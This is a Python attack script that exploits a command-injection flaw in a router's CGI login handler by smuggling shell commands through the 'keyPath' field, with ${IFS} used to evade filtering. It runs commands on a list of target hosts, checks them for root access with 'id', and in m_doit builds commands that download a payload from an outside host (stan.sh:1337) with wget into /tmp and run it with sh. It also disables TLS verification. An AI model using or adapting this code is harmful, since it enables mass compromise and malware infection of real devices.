from urllib import request, parse
from socket import timeout
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
def m_exec(cmd):
    ck = str(input('b> '))
    if ck == 'b':
        full_url = "{0}cgi-bin/corefunction.cgi"
    else:
        full_url = "{0}cgi-bin/mainfunction.cgi"
    
    ck = str(input('file> '))
    if ck == '':
        lfile='./list.txt'
    else:
        lfile='./%s'%ck

    with open(lfile, 'r') as fd:
        for ls in fd.readlines():
            url = ls.strip()
            if url=='':
                continue
            full_url=full_url.format(url)
            print('\n{0} result :'.format(url))
            
            payload = {
                'action': 'login',
                'keyPath': "'\n{0}\n#".format(cmd.replace(' ', '${IFS}')),  # $IFS for bypass regex +
                'loginUser': 'user',
                'loginPwd': 'pass',
            }
            try:
                data = parse.urlencode(payload).encode()    # urlencode
                req =  request.Request(full_url, data=data)
                resp = request.urlopen(req, timeout=3).read().decode('ISO-8859-1')
                if resp!='':
                    print(resp)
            except Exception as e:
                print(str(e))

def m_check(full_url, lfile):
    a=0
    d=0
    u=0
    l_a=[]
    ck = str(input('b> '))
    
    if full_url=="" and lfile=="":
        if ck == 'b':
            full_url = "{0}cgi-bin/corefunction.cgi"
        else:
            full_url = "{0}cgi-bin/mainfunction.cgi"
        ck = str(input('file> '))
        if ck == '':
            lfile='./list.txt'
        else:
            lfile='./%s'%ck


    with open(lfile, 'r') as fd:
        i=1
        for ls in fd.readlines():
            url = ls.strip()
            if url=='':
                continue
            full_url=full_url.format(url)
            payload = {
                'action': 'login',
                'keyPath': "'\n{0}\n#".format('id'.replace(' ', '${IFS}')),  # $IFS for bypass regex +
                'loginUser': 'user',
                'loginPwd': 'pass',
            }
            try:
                data = parse.urlencode(payload).encode()    # urlencode
                req =  request.Request(full_url, data=data)
                resp = request.urlopen(req, timeout=3).read().decode('ISO-8859-1')
                if 'root' in resp:
                    print('[A][{0:02d}]: {1}'.format(i, url))
                    a+=1
                    l_a.append(ls)
                else:
                    print('[D][{0:02d}]: {1}'.format(i, url))
                    d+=1
            except Exception as e:
                print('[U][{0:02d}]: {1}'.format(i, url))
                u+=1
            i+=1
    print('\nactive  : {:d}'.format(a))
    print('dead    : {:d}'.format(d))
    print('unknown : {:d}\n'.format(u))

    c = str(input('wanna update the list ?\nor test again ?\n[Y/T/n]=> '))
    if 'Y' == c:
        fd=open('./list.txt', 'w')
        for i in l_a:
            fd.write(i)
        fd.close()
    elif 'T' == c:
        m_check(full_url, lfile)

def m_doit(url, ver):
        ver = '2960'
        ck = str(input('file> '))
        if ck == '':
            lfile='./list.txt'
        else:
            lfile='./%s'%ck

        lcmd = [
            'wget http://stan.sh:1337/%s -O /tmp/ztmp'%ver,
            'sh /tmp/ztmp'
        ]
        c = False
        for cmd in lcmd:
            payload = {
                'action': 'login',
                'keyPath': "'\n{0}\n#".format(cmd.replace(' ', '${IFS}')),  # $IFS for bypass regex +
                'loginUser': 'user',
                'loginPwd': 'pass',
            }
            try:
                data = parse.urlencode(payload).encode()    # urlencode
                req =  request.Request(full_url, data=data)
                resp = request.urlopen(req, timeout=5)
            except Exception as e:
                print(str(e))